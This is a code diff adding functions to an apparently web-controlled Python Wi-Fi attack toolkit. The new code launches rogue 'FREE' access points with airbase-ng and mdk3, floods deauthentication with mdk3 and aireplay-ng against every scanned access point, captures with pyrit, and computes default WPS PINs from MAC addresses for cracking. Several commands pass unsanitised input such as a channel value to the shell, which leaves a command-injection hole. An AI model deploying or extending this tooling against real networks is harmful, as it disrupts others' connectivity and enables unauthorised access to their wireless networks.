@@ -10,7 +10,10 @@ __all__ = ['network_manager_stop', 'network_manager_read_conf', 'change_mac',
            'set_wlan_set_type_monitor', 'set_add_mon_type_monitor', 'get_ps',
            'get_iw_dev_info', 'set_del_mon_interface', 'set_hcxpcapngtool',
            'set_wpa_supplicant_stop', 'set_wpa_supplicant_start',
-           'get_wpa_supplicant_status', 'set_hashcat']
+           'get_wpa_supplicant_status', 'set_hashcat', 'get_mac_to_wpspin',
+           'get_name_to_mac', 'get_iwlist_wlan_scan_ssid', 'set_mdk3_fake_ap',
+           'set_airbase_fake_ap', 'set_mdk3_deauthentication', 'change_channel',
+           'set_aireplay_deauthentication', 'set_pyrit_striplive']
 
 
 def model(cmd, arg):
@@ -36,6 +39,12 @@ def change_power():
            f"ifconfig {WLAN} up"]
     [subprocess.call(i, shell=True) for i in cmd]
     return f"<h2><font color='green'>txpower {WLAN} changed</h2></font>"
+
+
+def change_channel(ch):
+    cmd = f"iwconfig {WLAN} channel {ch}"
+    subprocess.call(cmd, shell=True)
+    return f"<h2><font color='green'>channel {WLAN} changed on </font>{ch}</h2>"
 
 
 def network_manager_stop():
@@ -137,6 +146,41 @@ def set_airodump():
     return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
 
 
+def set_airbase_fake_ap():
+    set_add_mon_type_monitor()
+    cmd = f"airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
+    result = model(cmd=cmd, arg='')
+    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+
+
+def set_mdk3_fake_ap():
+    set_add_mon_type_monitor()
+    cmd = f"mdk3 {MON} b -v fake_ap -g -m"
+    # cmd = f"mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
+    result = model(cmd=cmd, arg='')
+    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+
+
+def set_mdk3_deauthentication():
+    # cmd = f"mdk3 {WLAN} d -c 1"
+    cmd = f"mdk3 {WLAN} d"
+    result = model(cmd=cmd, arg='')
+    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+
+
+def set_aireplay_deauthentication():
+    mac = get_iwlist_wlan_scan_mac()
+    # cmd = f"aireplay-ng -0 0 -D {WLAN}"
+    result = [model(cmd=f"aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
+    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"
+
+
+def set_pyrit_striplive():
+    cmd = f'pyrit -r {WLAN} -o {DUMP} stripLive'
+    subprocess.run(cmd, shell=True)
+    return f"<h2><font color='black'><pre>|result|</pre></font></h2>"
+
+
 def set_hcxdumptool():
     cmd = f'{PATH} -i {WLAN} -w {DUMP}'
     # cmd = f'hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
@@ -171,6 +215,31 @@ def set_hashcat():
     return 'result'
 
 
+def get_mac_to_wpspin(mac: str) -> str:
+    one = two = (int(mac, 16) & 0xFFFFFF) % 10000000
+    var1 = 0
+    while two:
+        var1 += 3 * (two % 10)
+        two = floor(two / 10)
+        var1 += two % 10
+        two = floor(two / 10)
+    var2 = (one * 10) + ((10 - (var1 % 10)) % 10)
+    var3 = str(int(var2))
+    wpspin = var3.zfill(8)
+    return f"<h2>Mac: {mac}. WPSPIN: <font color='blue'>{wpspin}</font></h2>"
+
+
+def get_name_to_mac(name) -> str:
+    result = model(cmd="iwlist scan", arg='')
+    ap = ''
+    for cell in result.split('Cell'):
+        if name in cell[210:263]:
+            ap += f'<pre>{cell[:263]}</pre>'
+    if not ap:
+        return "<h2><font color='red'>NOT FOUND</font></h2>"
+    return f"<h2><font color='blue'><pre>{ap}</pre></font></h2>"
+
+
 def get_ifconfig() -> str:
     command = "ifconfig"
     result = subprocess.run(command, capture_output=True).stdout.decode()
@@ -191,6 +260,21 @@ def get_iwlist_scan() -> str:
 def get_iw_list() -> str:
     result = model(cmd="iw list", arg='')
     return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"
+
+
+def get_iwlist_wlan_scan_ssid() -> str:
+    # cmd = "iwlist scan | grep Address"
+    cmd = "iwlist scan | grep ESSID"
+    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
+    output = '\n'.join(sys.stdout.split('\n'))
+    return f"<h2><font color='blue'><pre>{output}</pre></font></h2>"
+
+
+def get_iwlist_wlan_scan_mac() -> set:
+    cmd = "iwlist scan | grep Address"
+    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
+    output = set([i.strip() for i in sys.stdout.split(' ') if '\n' in i])
+    return output
 
 
 def get_iw_wlan_info() -> str:
